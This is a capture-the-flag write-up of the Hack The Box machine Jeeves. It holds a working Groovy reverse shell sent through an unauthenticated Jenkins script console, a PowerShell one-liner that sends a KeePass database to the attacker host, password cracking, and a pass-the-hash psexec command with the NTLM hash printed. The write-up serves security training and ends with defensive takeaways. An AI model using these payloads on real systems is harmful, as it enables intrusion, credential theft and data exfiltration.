# HTB Write-Up: Jeeves

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Jeeves)     |
| Difficulty | Medium                                                         |
| OS         | Windows                                                        |
| Author     | Landau                                                         |
| Date       | May 22, 2026                                                   |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial Access — Jenkins Script Console RCE](#3-initial-access--jenkins-script-console-rce)
4. [Privilege Escalation — KeePass Hash Extraction & Token Impersonation](#4-privilege-escalation--keepass-hash-extraction--token-impersonation)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid initial discovery:

```bash
rustscan -a 10.129.x.x --ulimit 5000
```

**Open Ports:**

| Port  | Service | Notes                                        |
|-------|---------|----------------------------------------------|
| 80    | HTTP    | IIS web server — displays a fake error page  |
| 135   | RPC     | Microsoft RPC endpoint mapper                |
| 445   | SMB     | Windows file sharing                         |
| 50000 | HTTP    | Jetty server — hosts Jenkins                 |

Port 80 returned a convincing "Microsoft SQL Server Error" page — a decoy with no functional application behind it. Port 50000 was the target of interest.

---

## 2. Enumeration

### 2.1 — SMB Enumeration

Anonymous SMB access was tested first:

```bash
smbclient -L //10.129.x.x -N
```

No shares were accessible without credentials. SMB was ruled out as an entry point.

### 2.2 — Directory Enumeration on Port 50000

Content discovery was performed against the Jetty server:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u http://10.129.x.x:50000/FUZZ \
     -fs 0
```

**Result:**

```
askjeeves    [Status: 302, Size: 0]
```

Navigating to `http://10.129.x.x:50000/askjeeves` redirected to a fully functional **Jenkins** instance — with no authentication required.

---

## 3. Initial Access — Jenkins Script Console RCE

### 3.1 — Identifying the Attack Surface

Jenkins exposes a **Groovy Script Console** at `/askjeeves/script`, accessible to any user with administrative privileges. Since the instance required no login, the console was directly accessible and allowed arbitrary code execution in the context of the Jenkins service account.

### 3.2 — Exploiting the Script Console

A reverse shell payload was executed via the Groovy console. A netcat listener was opened on the attacker machine first:

```bash
rlwrap nc -nvlp 4444
```

The following Groovy snippet was submitted through the console to spawn a PowerShell reverse shell:

```groovy
String host = "10.10.15.x";
int port = 4444;
String cmd = "cmd.exe";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy(); s.close();
```

**Result — Reverse shell obtained as `jeeves\kohsuke`:**

```
connect to [10.10.15.x] from (UNKNOWN) [10.129.x.x] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins\workspace>whoami
jeeves\kohsuke
```

The user flag was retrieved from `C:\Users\kohsuke\Desktop\user.txt`.

---

## 4. Privilege Escalation — KeePass Hash Extraction & Token Impersonation

### 4.1 — Locating the KeePass Database

Enumerating the user's home directory revealed a KeePass database file:

```
C:\Users\kohsuke\Documents\CEH.kdbx
```

The `.kdbx` file was transferred to the attacker machine for offline analysis:

**On the attacker machine (start listener):**
```bash
nc -lvnp 5555 > CEH.kdbx
```

**On the target (send file):**
```powershell
powershell -c "& {$client = New-Object Net.Sockets.TcpClient('10.10.15.x', 5555); $stream = $client.GetStream(); $bytes = [System.IO.File]::ReadAllBytes('C:\Users\kohsuke\Documents\CEH.kdbx'); $stream.Write($bytes, 0, $bytes.Length); $client.Close()}"
```

### 4.2 — Extracting the KeePass Master Password Hash

`keepass2john` was used to convert the database into a hash format suitable for cracking:

```bash
keepass2john CEH.kdbx > keepass.hash
```

The hash was cracked using **John the Ripper** against the rockyou wordlist:

```bash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**

```
moonshine1       (CEH)
```

Master password recovered: **`moonshine1`**

### 4.3 — Extracting Credentials from the Database

The database was opened locally with **KeePassXC** (or `kpcli`) using the recovered master password. Inspecting the entries revealed a stored credential:

| Title           | Username      | Password                     |
|-----------------|---------------|------------------------------|
| Backup stuff    | ?             | `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00` |

The password field contained an **NTLM hash** rather than a plaintext password — a direct pass-the-hash opportunity.

### 4.4 — Pass-the-Hash to SYSTEM

The recovered NTLM hash was used with **Impacket's `psexec.py`** to authenticate as Administrator without needing a plaintext password:

```bash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 \
    Administrator@10.129.x.x
```

**Result — SYSTEM shell obtained:**

```
C:\Windows\system32> whoami
nt authority\system
```

### 4.5 — Retrieving the Root Flag (Alternate Data Stream)

Navigating to `C:\Users\Administrator\Desktop\` revealed only a `hm.txt` file with no useful content. Listing alternate data streams (ADS) exposed a hidden flag:

```cmd
dir /R C:\Users\Administrator\Desktop\
```

**Result:**

```
hm.txt
hm.txt:root.txt:$DATA
```

The flag was read directly from the ADS:

```powershell
more < hm.txt:root.txt
```

**Root flag retrieved.**

---

## 5. Summary

| Phase                  | Technique                                                               | Result                                    |
|------------------------|-------------------------------------------------------------------------|-------------------------------------------|
| Recon                  | RustScan                                                                | 4 open ports; Jetty on 50000              |
| Enumeration            | ffuf directory fuzzing on port 50000                                    | `/askjeeves` reveals unauthenticated Jenkins |
| Initial Access         | Jenkins Groovy Script Console — arbitrary OS command execution          | Shell as `jeeves\kohsuke`                 |
| File Discovery         | Manual enumeration of user home directory                               | `CEH.kdbx` KeePass database              |
| Hash Extraction        | `keepass2john` + John the Ripper against rockyou.txt                   | Master password: `moonshine1`             |
| Credential Recovery    | KeePassXC database inspection                                           | NTLM hash stored in "Backup stuff" entry  |
| Privilege Escalation   | Impacket `psexec.py` pass-the-hash as Administrator                    | SYSTEM shell                              |
| Flag Retrieval         | Alternate Data Stream (`hm.txt:root.txt`)                              | Root flag                                 |

### Key Takeaways

- **Unauthenticated Jenkins instances are immediately critical.** The Groovy Script Console provides direct OS-level code execution. Jenkins should never be exposed to a network without authentication, and the service account it runs under should be low-privileged.
- **KeePass databases are high-value targets.** A `.kdbx` file on disk is only as secure as its master password. Weak passwords are trivially crackable with common wordlists — master passwords should be long, random passphrases not present in any wordlist.
- **Storing NTLM hashes as "passwords" eliminates the need to crack them.** Pass-the-hash attacks allow direct authentication with a hash alone. Plaintext credentials should always be stored in KeePass; if hashes must be recorded, they should be treated with the same sensitivity as passwords.
- **Alternate Data Streams are a practical hiding mechanism on Windows.** NTFS ADS are invisible to standard `dir` and file browser listings. Security teams should include ADS enumeration (`dir /R`, `streams.exe`) in incident response and CTF-style investigations.
